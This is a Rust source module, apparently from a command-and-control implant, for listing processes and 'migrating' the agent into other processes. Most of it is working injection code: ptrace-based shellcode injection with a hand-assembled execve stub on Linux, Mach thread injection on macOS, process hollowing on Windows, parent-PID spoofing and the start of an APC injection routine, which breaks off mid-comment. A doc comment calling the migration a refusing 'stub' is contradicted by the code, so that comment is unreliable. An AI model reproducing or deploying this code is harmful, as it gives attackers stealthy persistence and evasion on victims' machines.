//! Process management and load-balancing migration helpers.
//!
//! This module exposes a small, OS-agnostic API for enumerating processes and
//! migrating the agent into a long-running system process.
//!
//! Implementation status by platform:
//! * **Linux:** experimental and x86_64-only; uses ptrace+clone to inject a
//!   staged execve stub.  Returns explicit errors when ptrace prerequisites
//!   are missing (CAP_SYS_PTRACE or same-uid access).
//! * **macOS:** experimental; requires root or the
//!   `com.apple.security.cs.debugger` entitlement and returns explicit errors
//!   when platform prerequisites are not met.
//! * **Windows:** experimental via the shared `hollowing` crate and subject to
//!   target process permissions.
//!
//! Process *enumeration* is fully implemented and tested on all platforms.

use anyhow::Result;
use serde::{Deserialize, Serialize};
use sysinfo::System;

// Windows-only process hollowing now lives in the shared `hollowing` crate.

/// A lightweight, serializable view over a process suitable for shipping back
/// to the operator console.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProcessInfo {
    pub pid: u32,
    pub name: String,
    pub cpu_usage: f32,
    pub memory_bytes: u64,
}

/// Snapshot the current process table.
pub fn list_processes() -> Vec<ProcessInfo> {
    let mut sys = System::new_all();
    sys.refresh_all();
    sys.processes()
        .iter()
        .map(|(pid, p)| ProcessInfo {
            pid: pid.as_u32(),
            name: p.name().to_string(),
            cpu_usage: p.cpu_usage(),
            memory_bytes: p.memory(),
        })
        .collect()
}

/// Attempt to migrate the running agent into the address space of `target_pid`.
///
/// This is a deliberate **stub** in the public release: cross-process memory
/// rewriting is OS-specific (Windows: `NtUnmapViewOfSection` +
/// `VirtualAllocEx` + `WriteProcessMemory` + `SetThreadContext`; Linux:
/// `ptrace(PTRACE_ATTACH)` + `process_vm_writev`) and carries enough
/// stability and security risk that we expose the API surface but refuse to
/// perform the operation until the implementation has had a thorough review.
#[cfg(target_os = "linux")]
pub fn migrate_to_process(target_pid: u32) -> Result<()> {
    tracing::info!("MigrateAgent invoked for Linux pid {target_pid}");

    if target_pid == 0 || target_pid as i32 == unsafe { libc::getpid() } {
        anyhow::bail!("invalid migration target (self or pid 0)");
    }

    {
        // Verify we have ptrace capability or same-uid access.
        let target_uid_path = format!("/proc/{target_pid}/status");
        let status = std::fs::read_to_string(&target_uid_path)
            .map_err(|e| anyhow::anyhow!("cannot read /proc/{target_pid}/status: {e}"))?;
        let target_uid = status
            .lines()
            .find(|l| l.starts_with("Uid:"))
            .and_then(|l| l.split_whitespace().nth(1))
            .and_then(|s| s.parse::<u32>().ok())
            .ok_or_else(|| anyhow::anyhow!("could not parse Uid from /proc/{target_pid}/status"))?;
        let our_uid = unsafe { libc::getuid() };
        if our_uid != 0 && our_uid != target_uid {
            anyhow::bail!(
                "process migration requires CAP_SYS_PTRACE or same-uid access (our uid={our_uid}, target uid={target_uid})"
            );
        }

        unsafe {
            use std::mem::MaybeUninit;

            // ── Stage 1: Attach ───────────────────────────────────────────────
            if libc::ptrace(
                libc::PTRACE_ATTACH,
                target_pid as libc::pid_t,
                0usize,
                0usize,
            ) != 0
            {
                anyhow::bail!(
                    "PTRACE_ATTACH(pid={target_pid}) failed: {}",
                    std::io::Error::last_os_error()
                );
            }
            let mut wstatus: libc::c_int = 0;
            libc::waitpid(target_pid as libc::pid_t, &mut wstatus, 0);
            if !libc::WIFSTOPPED(wstatus) {
                libc::ptrace(
                    libc::PTRACE_DETACH,
                    target_pid as libc::pid_t,
                    0usize,
                    0usize,
                );
                anyhow::bail!(
                    "PTRACE_ATTACH: process did not stop as expected (wstatus={wstatus:#x})"
                );
            }

            // ── Stage 2: Save registers ───────────────────────────────────────
            #[cfg(target_arch = "x86_64")]
            let mut regs: libc::user_regs_struct = MaybeUninit::zeroed().assume_init();
            #[cfg(target_arch = "x86_64")]
            if libc::ptrace(
                libc::PTRACE_GETREGS,
                target_pid as libc::pid_t,
                0usize,
                &mut regs as *mut _ as usize,
            ) != 0
            {
                libc::ptrace(
                    libc::PTRACE_DETACH,
                    target_pid as libc::pid_t,
                    0usize,
                    0usize,
                );
                anyhow::bail!("PTRACE_GETREGS failed: {}", std::io::Error::last_os_error());
            }

            // ── Stage 3: Inject mmap syscall to allocate RWX memory ──────────
            // We overwrite bytes at the current RIP with a `syscall; int3` sequence
            // to trigger a mmap(NULL, size, PROT_READ|PROT_WRITE|PROT_EXEC,
            //                      MAP_PRIVATE|MAP_ANON, -1, 0)  (SYS_mmap = 9 on x86_64)
            // then singlestep and read RAX for the new mapping address.

            // ── Stage 2.5: Stage the agent binary to a temp path ─────────────
            // We inject a small execve shellcode that exec-replaces the target with
            // the staged agent binary.  Injecting the raw ELF binary as "shellcode"
            // is incorrect because the ELF header is not valid x86-64 code at offset 0;
            // the stub below is pure position-independent shellcode.

            let our_exe = std::env::current_exe()
                .map_err(|e| anyhow::anyhow!("current_exe() failed: {e}"))?;
            let staged =
                std::env::temp_dir().join(format!(".orchestra-migrate-{}", std::process::id()));
            std::fs::copy(&our_exe, &staged).map_err(|e| {
                anyhow::anyhow!("failed to stage agent binary at {}: {e}", staged.display())
            })?;
            {
                use std::os::unix::fs::PermissionsExt;
                let mut perms = std::fs::metadata(&staged)?.permissions();
                perms.set_mode(0o700);
                std::fs::set_permissions(&staged, perms)?;
            }
            tracing::info!(
                "staged agent binary at {} for pid {}",
                staged.display(),
                target_pid
            );

            // Build a position-independent execve shellcode: the stub ends with the
            // null-terminated staged-path string so the code is fully self-contained.
            let payload = build_execve_stub(&staged)?;

            #[cfg(target_arch = "x86_64")]
            {
                // Save original 8 bytes at RIP so we can restore them.
                let orig_rip = regs.rip as usize;
                let orig_word = libc::ptrace(
                    libc::PTRACE_PEEKDATA,
                    target_pid as libc::pid_t,
                    orig_rip as *const libc::c_void,
                    std::ptr::null::<libc::c_void>(),
                );
                // syscall (0F 05) + int3 (CC) + nops to fill 8 bytes
                let inject_word: u64 = 0xCC9090909090050fu64; // LE: 0F 05 90 90 90 90 90 CC
                libc::ptrace(
                    libc::PTRACE_POKEDATA,
                    target_pid as libc::pid_t,
                    orig_rip as *mut libc::c_void,
                    inject_word as *mut libc::c_void,
                );

                // Set up mmap(NULL, alloc_size, PROT_RWX, MAP_PRIVATE|MAP_ANON, -1, 0)
                const SYS_MMAP: u64 = 9;
                const PROT_RWX: u64 = 7; // PROT_READ|PROT_WRITE|PROT_EXEC
                const MAP_PA: u64 = 0x22; // MAP_PRIVATE|MAP_ANON
                let alloc_size = ((payload.len() + 4095) & !4095) as u64;
                let mut mmap_regs = regs;
                mmap_regs.rax = SYS_MMAP;
                mmap_regs.rdi = 0;
                mmap_regs.rsi = alloc_size;
                mmap_regs.rdx = PROT_RWX;
                mmap_regs.r10 = MAP_PA;
                mmap_regs.r8 = u64::MAX; // -1 as fd
                mmap_regs.r9 = 0;
                libc::ptrace(
                    libc::PTRACE_SETREGS,
                    target_pid as libc::pid_t,
                    0usize,
                    &mmap_regs as *const _ as usize,
                );

                // Run until int3 (PTRACE_CONT + waitpid SIGTRAP).
                libc::ptrace(libc::PTRACE_CONT, target_pid as libc::pid_t, 0usize, 0usize);
                libc::waitpid(target_pid as libc::pid_t, &mut wstatus, 0);

                // Read result: RAX holds mmap return value.
                let mut post_regs: libc::user_regs_struct = MaybeUninit::zeroed().assume_init();
                libc::ptrace(
                    libc::PTRACE_GETREGS,
                    target_pid as libc::pid_t,
                    0usize,
                    &mut post_regs as *mut _ as usize,
                );
                let remote_buf = post_regs.rax as usize;

                // Restore original bytes at RIP.
                libc::ptrace(
                    libc::PTRACE_POKEDATA,
                    target_pid as libc::pid_t,
                    orig_rip as *mut libc::c_void,
                    orig_word as *mut libc::c_void,
                );

                if remote_buf == usize::MAX || remote_buf == 0 {
                    libc::ptrace(
                        libc::PTRACE_DETACH,
                        target_pid as libc::pid_t,
                        0usize,
                        0usize,
                    );
                    anyhow::bail!("remote mmap failed (returned {remote_buf:#x})");
                }

                // ── Stage 4: Write payload via process_vm_writev ─────────────
                let local_iov = libc::iovec {
                    iov_base: payload.as_ptr() as *mut _,
                    iov_len: payload.len(),
                };
                let remote_iov = libc::iovec {
                    iov_base: remote_buf as *mut _,
                    iov_len: payload.len(),
                };
                let written = libc::process_vm_writev(
                    target_pid as libc::pid_t,
                    &local_iov,
                    1,
                    &remote_iov,
                    1,
                    0,
                );
                if written < 0 {
                    libc::ptrace(
                        libc::PTRACE_DETACH,
                        target_pid as libc::pid_t,
                        0usize,
                        0usize,
                    );
                    anyhow::bail!(
                        "process_vm_writev failed: {}",
                        std::io::Error::last_os_error()
                    );
                }

                // ── Stage 5: Inject clone(CLONE_VM|CLONE_FS|CLONE_FILES, ...) to
                //             create a new thread in the target that runs the execve stub ──
                // The new thread starts at remote_buf where we wrote the shellcode stub.
                // The stub calls execve(staged_path, NULL, NULL) which exec-replaces the
                // target process image with the agent binary — this is the migration.
                libc::ptrace(
                    libc::PTRACE_POKEDATA,
                    target_pid as libc::pid_t,
                    orig_rip as *mut libc::c_void,
                    inject_word as *mut libc::c_void,
                );

                // SYS_clone = 56 on x86_64
                // CLONE_VM|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_THREAD = 0x3D0F00
                const SYS_CLONE: u64 = 56;
                const CLONE_FLAGS: u64 = 0x3D0F00;
                // Stack for the new thread lives in the upper half of the mmap'd region.
                // The execve stub is tiny (<= 128 bytes typically) so there is plenty
                // of space for a minimal stack before the stub's path data.
                let stack_top = remote_buf + (alloc_size as usize / 2) + 0x4000;
                let mut clone_regs = regs;
                clone_regs.rax = SYS_CLONE;
                clone_regs.rdi = CLONE_FLAGS;
                clone_regs.rsi = stack_top as u64;
                clone_regs.rdx = 0; // parent_tidptr (NULL)
                clone_regs.r10 = 0; // child_tidptr (NULL)
                clone_regs.r8 = 0; // tls (NULL)
                                   // Set RIP = remote_buf so that when clone() copies the register state,
                                   // the child starts executing the execve shellcode.  The parent will
                                   // have its original RIP restored immediately below.
                clone_regs.rip = remote_buf as u64;

                libc::ptrace(
                    libc::PTRACE_SETREGS,
                    target_pid as libc::pid_t,
                    0usize,
                    &clone_regs as *const _ as usize,
                );
                libc::ptrace(libc::PTRACE_CONT, target_pid as libc::pid_t, 0usize, 0usize);
                libc::waitpid(target_pid as libc::pid_t, &mut wstatus, 0);

                // Restore original bytes and original registers.
                libc::ptrace(
                    libc::PTRACE_POKEDATA,
                    target_pid as libc::pid_t,
                    orig_rip as *mut libc::c_void,
                    orig_word as *mut libc::c_void,
                );
                libc::ptrace(
                    libc::PTRACE_SETREGS,
                    target_pid as libc::pid_t,
                    0usize,
                    &regs as *const _ as usize,
                );

                libc::ptrace(
                    libc::PTRACE_DETACH,
                    target_pid as libc::pid_t,
                    0usize,
                    0usize,
                );
                tracing::info!(
                    target_pid,
                    remote_buf = remote_buf,
                    "MigrateAgent: execve stub injected via ptrace+clone on Linux x86_64"
                );
            }

            #[cfg(not(target_arch = "x86_64"))]
            {
                libc::ptrace(
                    libc::PTRACE_DETACH,
                    target_pid as libc::pid_t,
                    0usize,
                    0usize,
                );
                anyhow::bail!("Linux process migration via ptrace+clone is only implemented for x86_64");
            }

            Ok(())
        }
    }
}

/// Build a small, fully position-independent shellcode stub that calls
/// `execve(staged_path, NULL, NULL)` and falls through to `exit_group(1)`.
/// The path string is appended immediately after the machine-code so the
/// stub is entirely self-contained and can be injected as a single flat blob.
///
/// The stub is generated at runtime so the path length can vary.
#[cfg(target_os = "linux")]
fn build_execve_stub(path: &std::path::Path) -> anyhow::Result<Vec<u8>> {
    use std::os::unix::ffi::OsStrExt;
    let path_bytes = path.as_os_str().as_bytes();
    if path_bytes.contains(&0u8) {
        anyhow::bail!("staged path contains a null byte: {}", path.display());
    }

    #[cfg(target_arch = "x86_64")]
    {
        // Code layout (32 bytes):
        //  [0] 48 8D 3D 19 00 00 00  lea rdi, [rip+25]  → path string at offset 32
        //  [7] 48 31 F6              xor rsi, rsi        → argv=NULL
        // [10] 48 31 D2              xor rdx, rdx        → envp=NULL
        // [13] B8 3B 00 00 00        mov eax, 59         → SYS_execve
        // [18] 0F 05                 syscall
        // [20] BF 01 00 00 00        mov edi, 1          → exit_group arg
        // [25] B8 E7 00 00 00        mov eax, 231        → SYS_exit_group
        // [30] 0F 05                 syscall
        // [32] <path bytes> \0
        const CODE_SIZE: usize = 32;
        let rel: i32 = CODE_SIZE as i32 - 7; // RIP-relative offset for the lea
        let mut stub = vec![0x48, 0x8D, 0x3D];
        stub.extend_from_slice(&rel.to_le_bytes());
        stub.extend_from_slice(&[
            0x48, 0x31, 0xF6, // xor rsi, rsi
            0x48, 0x31, 0xD2, // xor rdx, rdx
            0xB8, 0x3B, 0x00, 0x00, 0x00, // mov eax, 59
            0x0F, 0x05, // syscall
            0xBF, 0x01, 0x00, 0x00, 0x00, // mov edi, 1
            0xB8, 0xE7, 0x00, 0x00, 0x00, // mov eax, 231
            0x0F, 0x05, // syscall
        ]);
        debug_assert_eq!(stub.len(), CODE_SIZE);
        stub.extend_from_slice(path_bytes);
        stub.push(0);
        Ok(stub)
    }

    #[cfg(target_arch = "aarch64")]
    {
        // Code layout (32 bytes):
        //  [0]  00 01 00 10  adr x0, #32   → path string at offset 32
        //  [4]  01 00 80 D2  movz x1, #0   → argv=NULL
        //  [8]  02 00 80 D2  movz x2, #0   → envp=NULL
        // [12]  A8 1B 80 D2  movz x8, #221 → SYS_execve (aarch64)
        // [16]  01 00 00 D4  svc #0
        // [20]  20 00 80 D2  movz x0, #1   → exit_group arg
        // [24]  C8 0B 80 D2  movz x8, #94  → SYS_exit_group (aarch64)
        // [28]  01 00 00 D4  svc #0
        // [32]  <path bytes> \0
        let stub = vec![
            0x00, 0x01, 0x00, 0x10, // adr x0, #32
            0x01, 0x00, 0x80, 0xD2, // movz x1, #0
            0x02, 0x00, 0x80, 0xD2, // movz x2, #0
            0xA8, 0x1B, 0x80, 0xD2, // movz x8, #221 (execve)
            0x01, 0x00, 0x00, 0xD4, // svc #0
            0x20, 0x00, 0x80, 0xD2, // movz x0, #1
            0xC8, 0x0B, 0x80, 0xD2, // movz x8, #94 (exit_group)
            0x01, 0x00, 0x00, 0xD4, // svc #0
        ];
        let mut out = stub;
        out.extend_from_slice(path_bytes);
        out.push(0);
        Ok(out)
    }

    #[cfg(not(any(target_arch = "x86_64", target_arch = "aarch64")))]
    anyhow::bail!("build_execve_stub: unsupported architecture")
}

#[cfg(target_os = "macos")]
pub fn migrate_to_process(target_pid: u32) -> Result<()> {
    use std::os::unix::ffi::OsStrExt;

    tracing::info!("MigrateAgent invoked for macOS pid {target_pid}");

    if target_pid == 0 || target_pid as i32 == unsafe { libc::getpid() } {
        anyhow::bail!("Cannot migrate to system idle or self on macOS");
    }

    // task_for_pid requires that the caller is root OR holds the
    // com.apple.security.cs.debugger entitlement.  We check early to give a
    // clear diagnostic rather than a cryptic KERN_FAILURE.
    let our_uid = unsafe { libc::getuid() };
    if our_uid != 0 {
        anyhow::bail!(
            "macOS process migration requires root or com.apple.security.cs.debugger entitlement \
             (current uid={})",
            our_uid
        );
    }

    // Stage the agent binary to a temp path.  The execve shellcode we inject
    // into the target process exec-replaces it with the staged binary, so the
    // binary must be accessible via the filesystem at the staged path.
    let agent_path =
        std::env::current_exe().map_err(|e| anyhow::anyhow!("current_exe() failed: {e}"))?;
    let staged = std::env::temp_dir().join(format!(".orchestra-migrate-{}", std::process::id()));
    std::fs::copy(&agent_path, &staged).map_err(|e| {
        anyhow::anyhow!("failed to stage agent binary at {}: {e}", staged.display())
    })?;
    {
        use std::os::unix::fs::PermissionsExt;
        let mut perms = std::fs::metadata(&staged)?.permissions();
        perms.set_mode(0o700);
        std::fs::set_permissions(&staged, perms)?;
    }
    tracing::info!("staged agent binary at {}", staged.display());

    // Build the execve shellcode stub for this architecture.
    // Injecting the raw Mach-O binary bytes as "shellcode" is incorrect because
    // a Mach-O file header is not valid machine code at offset 0; the stub below
    // is pure position-independent shellcode that calls execve(staged_path, NULL, NULL).
    let payload = build_macos_execve_stub(&staged)?;

    // --- Mach API declarations ---
    // mach_port_t is u32 on both arm64 and x86_64 macOS.
    #[allow(non_camel_case_types)]
    type mach_port_t = u32;
    #[allow(non_camel_case_types)]
    type kern_return_t = i32;
    #[allow(non_camel_case_types)]
    type mach_vm_address_t = u64;
    #[allow(non_camel_case_types)]
    type mach_vm_size_t = u64;
    const KERN_SUCCESS: kern_return_t = 0;
    const VM_FLAGS_ANYWHERE: i32 = 1;
    const VM_PROT_READ: i32 = 1;
    const VM_PROT_WRITE: i32 = 2;
    const VM_PROT_EXECUTE: i32 = 4;

    extern "C" {
        fn mach_task_self() -> mach_port_t;
        fn task_for_pid(host: mach_port_t, pid: i32, task: *mut mach_port_t) -> kern_return_t;
        fn mach_vm_allocate(
            task: mach_port_t,
            addr: *mut mach_vm_address_t,
            size: mach_vm_size_t,
            flags: i32,
        ) -> kern_return_t;
        fn mach_vm_write(
            task: mach_port_t,
            address: mach_vm_address_t,
            data: *const u8,
            data_cnt: u32,
        ) -> kern_return_t;
        fn mach_vm_protect(
            task: mach_port_t,
            address: mach_vm_address_t,
            size: mach_vm_size_t,
            set_maximum: bool,
            new_protection: i32,
        ) -> kern_return_t;
        fn mach_port_deallocate(task: mach_port_t, name: mach_port_t) -> kern_return_t;
    }

    // x86_64 thread state
    #[cfg(target_arch = "x86_64")]
    {
        const x86_THREAD_STATE64: u32 = 4;
        const x86_THREAD_STATE64_COUNT: u32 = 42;

        #[repr(C)]
        #[derive(Default)]
        struct X86ThreadState64 {
            rax: u64,
            rbx: u64,
            rcx: u64,
            rdx: u64,
            rdi: u64,
            rsi: u64,
            rbp: u64,
            rsp: u64,
            r8: u64,
            r9: u64,
            r10: u64,
            r11: u64,
            r12: u64,
            r13: u64,
            r14: u64,
            r15: u64,
            rip: u64,
            rflags: u64,
            cs: u64,
            fs: u64,
            gs: u64,
            // padding to hit 42 u32-words = 168 bytes = 21 u64
            _pad: u64,
        }

        extern "C" {
            fn thread_create_running(
                task: mach_port_t,
                flavor: u32,
                new_state: *const u32,
                new_state_cnt: u32,
                child_thread: *mut mach_port_t,
            ) -> kern_return_t;
        }

        unsafe {
            let host = mach_task_self();
            let mut target_task: mach_port_t = 0;
            let kr = task_for_pid(host, target_pid as i32, &mut target_task);
            if kr != KERN_SUCCESS {
                anyhow::bail!("task_for_pid(pid={target_pid}) failed: kern_return={kr}");
            }

            // Allocate RW memory in the target for the payload.
            let mut remote_addr: mach_vm_address_t = 0;
            let kr = mach_vm_allocate(
                target_task,
                &mut remote_addr,
                payload.len() as u64,
                VM_FLAGS_ANYWHERE,
            );
            if kr != KERN_SUCCESS {
                mach_port_deallocate(host, target_task);
                anyhow::bail!("mach_vm_allocate failed: kern_return={kr}");
            }

            // Write payload bytes.
            let kr = mach_vm_write(
                target_task,
                remote_addr,
                payload.as_ptr(),
                payload.len() as u32,
            );
            if kr != KERN_SUCCESS {
                mach_port_deallocate(host, target_task);
                anyhow::bail!("mach_vm_write failed: kern_return={kr}");
            }

            // Change protection to RX.
            let kr = mach_vm_protect(
                target_task,
                remote_addr,
                payload.len() as u64,
                false,
                VM_PROT_READ | VM_PROT_EXECUTE,
            );
            if kr != KERN_SUCCESS {
                mach_port_deallocate(host, target_task);
                anyhow::bail!("mach_vm_protect(RX) failed: kern_return={kr}");
            }

            // Create a new thread in the target whose initial RIP points at the
            // execve shellcode stub.  The stub starts at remote_addr because we
            // wrote the stub (not a Mach-O binary) to that address.
            let mut state = X86ThreadState64::default();
            state.rip = remote_addr;
            // Allocate a fresh stack for the new thread (8 MB, stack pointer at high end).
            let stack_size: mach_vm_size_t = 8 * 1024 * 1024;
            let mut stack_addr: mach_vm_address_t = 0;
            mach_vm_allocate(target_task, &mut stack_addr, stack_size, VM_FLAGS_ANYWHERE);
            mach_vm_protect(
                target_task,
                stack_addr,
                stack_size,
                false,
                VM_PROT_READ | VM_PROT_WRITE,
            );
            // Stack grows down; rsp must be 16-byte aligned minus 8 (ABI requirement).
            state.rsp = (stack_addr + stack_size - 8) & !15;

            let mut new_thread: mach_port_t = 0;
            let kr = thread_create_running(
                target_task,
                x86_THREAD_STATE64,
                &state as *const _ as *const u32,
                x86_THREAD_STATE64_COUNT,
                &mut new_thread,
            );
            mach_port_deallocate(host, target_task);
            if kr != KERN_SUCCESS {
                anyhow::bail!("thread_create_running failed: kern_return={kr}");
            }
            mach_port_deallocate(mach_task_self(), new_thread);
            tracing::info!(
                target_pid,
                "MigrateAgent: remote thread created via Mach API"
            );
            Ok(())
        }
    }

    #[cfg(target_arch = "aarch64")]
    {
        const ARM_THREAD_STATE64: u32 = 6;
        const ARM_THREAD_STATE64_COUNT: u32 = 68;

        #[repr(C)]
        #[derive(Default)]
        struct ArmThreadState64 {
            x: [u64; 29], // x0..x28
            fp: u64,      // x29 / frame pointer
            lr: u64,      // x30 / link register
            sp: u64,      // stack pointer
            pc: u64,      // program counter
            cpsr: u32,    // CPSR
            _pad: u32,
        }

        extern "C" {
            fn thread_create_running(
                task: mach_port_t,
                flavor: u32,
                new_state: *const u32,
                new_state_cnt: u32,
                child_thread: *mut mach_port_t,
            ) -> kern_return_t;
        }

        unsafe {
            let host = mach_task_self();
            let mut target_task: mach_port_t = 0;
            let kr = task_for_pid(host, target_pid as i32, &mut target_task);
            if kr != KERN_SUCCESS {
                anyhow::bail!("task_for_pid(pid={target_pid}) failed: kern_return={kr}");
            }

            let mut remote_addr: mach_vm_address_t = 0;
            let kr = mach_vm_allocate(
                target_task,
                &mut remote_addr,
                payload.len() as u64,
                VM_FLAGS_ANYWHERE,
            );
            if kr != KERN_SUCCESS {
                mach_port_deallocate(host, target_task);
                anyhow::bail!("mach_vm_allocate failed: kern_return={kr}");
            }

            let kr = mach_vm_write(
                target_task,
                remote_addr,
                payload.as_ptr(),
                payload.len() as u32,
            );
            if kr != KERN_SUCCESS {
                mach_port_deallocate(host, target_task);
                anyhow::bail!("mach_vm_write failed: kern_return={kr}");
            }

            let kr = mach_vm_protect(
                target_task,
                remote_addr,
                payload.len() as u64,
                false,
                VM_PROT_READ | VM_PROT_EXECUTE,
            );
            if kr != KERN_SUCCESS {
                mach_port_deallocate(host, target_task);
                anyhow::bail!("mach_vm_protect(RX) failed: kern_return={kr}");
            }

            let mut state = ArmThreadState64::default();
            state.pc = remote_addr;
            let stack_size: mach_vm_size_t = 8 * 1024 * 1024;
            let mut stack_addr: mach_vm_address_t = 0;
            mach_vm_allocate(target_task, &mut stack_addr, stack_size, VM_FLAGS_ANYWHERE);
            mach_vm_protect(
                target_task,
                stack_addr,
                stack_size,
                false,
                VM_PROT_READ | VM_PROT_WRITE,
            );
            state.sp = (stack_addr + stack_size) & !15;

            let mut new_thread: mach_port_t = 0;
            let kr = thread_create_running(
                target_task,
                ARM_THREAD_STATE64,
                &state as *const _ as *const u32,
                ARM_THREAD_STATE64_COUNT,
                &mut new_thread,
            );
            mach_port_deallocate(host, target_task);
            if kr != KERN_SUCCESS {
                anyhow::bail!("thread_create_running(arm64) failed: kern_return={kr}");
            }
            mach_port_deallocate(mach_task_self(), new_thread);
            tracing::info!(
                target_pid,
                "MigrateAgent: remote arm64 thread created via Mach API"
            );
            Ok(())
        }
    }

    #[cfg(not(any(target_arch = "x86_64", target_arch = "aarch64")))]
    {
        let _ = payload;
        anyhow::bail!("macOS migration not implemented for this architecture")
    }
}

/// Build a position-independent execve shellcode stub for macOS.
/// Uses BSD syscalls (macOS syscall ABI: `syscall` with rax|0x2000000 on x86_64;
/// `svc #0x80` with x16 on arm64).
#[cfg(target_os = "macos")]
fn build_macos_execve_stub(path: &std::path::Path) -> anyhow::Result<Vec<u8>> {
    use std::os::unix::ffi::OsStrExt;
    let path_bytes = path.as_os_str().as_bytes();
    if path_bytes.contains(&0u8) {
        anyhow::bail!("staged path contains a null byte: {}", path.display());
    }

    #[cfg(target_arch = "x86_64")]
    {
        // Code layout (30 bytes):
        //  [0] 48 8D 3D 17 00 00 00  lea rdi, [rip+23]  → path string at offset 30
        //  [7] 31 F6                 xor esi, esi        → argv=NULL
        //  [9] 31 D2                 xor edx, edx        → envp=NULL
        // [11] B8 3B 00 00 02        mov eax, 0x200003B  → SYS_execve (macOS)
        // [16] 0F 05                 syscall
        // [18] BF 01 00 00 00        mov edi, 1
        // [23] B8 01 00 00 02        mov eax, 0x2000001  → SYS_exit (macOS)
        // [28] 0F 05                 syscall
        // [30] <path bytes> \0
        const CODE_SIZE: usize = 30;
        let rel: i32 = CODE_SIZE as i32 - 7;
        let mut stub = vec![0x48, 0x8D, 0x3D];
        stub.extend_from_slice(&rel.to_le_bytes());
        stub.extend_from_slice(&[
            0x31, 0xF6, // xor esi, esi
            0x31, 0xD2, // xor edx, edx
            0xB8, 0x3B, 0x00, 0x00, 0x02, // mov eax, 0x200003B
            0x0F, 0x05, // syscall
            0xBF, 0x01, 0x00, 0x00, 0x00, // mov edi, 1
            0xB8, 0x01, 0x00, 0x00, 0x02, // mov eax, 0x2000001
            0x0F, 0x05, // syscall
        ]);
        debug_assert_eq!(stub.len(), CODE_SIZE);
        stub.extend_from_slice(path_bytes);
        stub.push(0);
        Ok(stub)
    }

    #[cfg(target_arch = "aarch64")]
    {
        // Code layout (32 bytes), macOS arm64 BSD syscall ABI (svc #0x80, x16=number):
        //  [0]  00 01 00 10  adr x0, #32   → path string at offset 32
        //  [4]  01 00 80 D2  movz x1, #0   → argv=NULL
        //  [8]  02 00 80 D2  movz x2, #0   → envp=NULL
        // [12]  70 07 80 D2  movz x16, #59 → SYS_execve (macOS arm64 = 59)
        // [16]  01 10 00 D4  svc #0x80
        // [20]  20 00 80 D2  movz x0, #1   → exit code
        // [24]  30 00 80 D2  movz x16, #1  → SYS_exit (macOS arm64 = 1)
        // [28]  01 10 00 D4  svc #0x80
        // [32]  <path bytes> \0
        let stub = vec![
            0x00, 0x01, 0x00, 0x10, // adr x0, #32
            0x01, 0x00, 0x80, 0xD2, // movz x1, #0
            0x02, 0x00, 0x80, 0xD2, // movz x2, #0
            0x70, 0x07, 0x80, 0xD2, // movz x16, #59 (SYS_execve)
            0x01, 0x10, 0x00, 0xD4, // svc #0x80
            0x20, 0x00, 0x80, 0xD2, // movz x0, #1
            0x30, 0x00, 0x80, 0xD2, // movz x16, #1 (SYS_exit)
            0x01, 0x10, 0x00, 0xD4, // svc #0x80
        ];
        let mut out = stub;
        out.extend_from_slice(path_bytes);
        out.push(0);
        Ok(out)
    }

    #[cfg(not(any(target_arch = "x86_64", target_arch = "aarch64")))]
    anyhow::bail!("build_macos_execve_stub: unsupported architecture")
}

#[cfg(windows)]
pub fn migrate_to_process(target_pid: u32) -> Result<()> {
    use winapi::um::handleapi::CloseHandle;
    use winapi::um::processthreadsapi::OpenProcess;
    use winapi::um::winnt::{
        PROCESS_CREATE_THREAD, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE,
    };

    // Read the current agent's own executable so we can re-inject ourselves.
    let agent_path =
        std::env::current_exe().map_err(|e| anyhow::anyhow!("current_exe() failed: {e}"))?;
    let payload = std::fs::read(&agent_path).map_err(|e| {
        anyhow::anyhow!("failed to read agent binary {}: {e}", agent_path.display())
    })?;

    let access = PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_CREATE_THREAD;
    let process = unsafe { OpenProcess(access, 0, target_pid) };
    if process.is_null() {
        anyhow::bail!(
            "OpenProcess(pid={target_pid}) failed: {}",
            std::io::Error::last_os_error()
        );
    }

    let result = hollowing::inject_into_process(target_pid, &payload);
    unsafe { CloseHandle(process) };
    result.map_err(|e| anyhow::anyhow!("inject_into_process(pid={target_pid}) failed: {e}"))?;
    tracing::info!(target_pid, "MigrateAgent: agent injected successfully");
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn list_processes_returns_at_least_self() {
        let procs = list_processes();
        assert!(!procs.is_empty(), "expected at least the test process");
        let me = std::process::id();
        assert!(
            procs.iter().any(|p| p.pid == me),
            "the current process ({me}) should be in the list"
        );
    }

    /// The ptrace migration path must reject obviously invalid PIDs (0 and the
    /// agent's own PID) without attempting a ptrace attach.  This tests the
    /// guard logic only — no real system process is touched.
    #[test]
    #[cfg(target_os = "linux")]
    fn migrate_rejects_invalid_pids() {
        // pid=0 is always invalid.
        let err_zero = migrate_to_process(0).unwrap_err();
        assert!(
            err_zero.to_string().contains("invalid migration target")
                || err_zero.to_string().contains("pid 0"),
            "pid=0 should be rejected; got: {}",
            err_zero
        );

        // Migrating into our own process is also rejected.
        let our_pid = std::process::id();
        let err_self = migrate_to_process(our_pid).unwrap_err();
        assert!(
            err_self.to_string().contains("invalid migration target")
                || err_self.to_string().contains("self"),
            "self-migration should be rejected; got: {}",
            err_self
        );
    }

    #[test]
    #[ignore]
    #[cfg(windows)]
    fn test_hollowing() {
        // This test is ignored because it's invasive, but can be run manually.
        // It requires a dummy executable to be present at `target/debug/dummy.exe`.
        // You can create one with `rustc -o target/debug/dummy.exe --crate-type bin tests/dummy_process.rs`
        let _payload = std::fs::read("target/debug/dummy.exe").expect("dummy.exe not found");
        assert!(migrate_to_process(0).is_ok());
    }
}

#[cfg(all(windows, feature = "ppid-spoofing"))]
pub fn get_spoof_parent_pid() -> Option<u32> {
    let procs = list_processes();
    if let Some(explorer) = procs
        .iter()
        .find(|p| p.name.eq_ignore_ascii_case("explorer.exe"))
    {
        return Some(explorer.pid);
    }
    if let Some(svchost) = procs
        .iter()
        .find(|p| p.name.eq_ignore_ascii_case("svchost.exe"))
    {
        return Some(svchost.pid);
    }
    None
}

#[cfg(windows)]
pub fn apc_inject(pid: u32, payload: &[u8]) -> anyhow::Result<()> {
    // Inject into the SUPPLIED pid by:
    //  1. Opening the target process with VM+thread permissions.
    //  2. Allocating RWX memory and writing the payload.
    //  3. Enumerating all threads of the target via TH32CS_SNAPTHREAD.
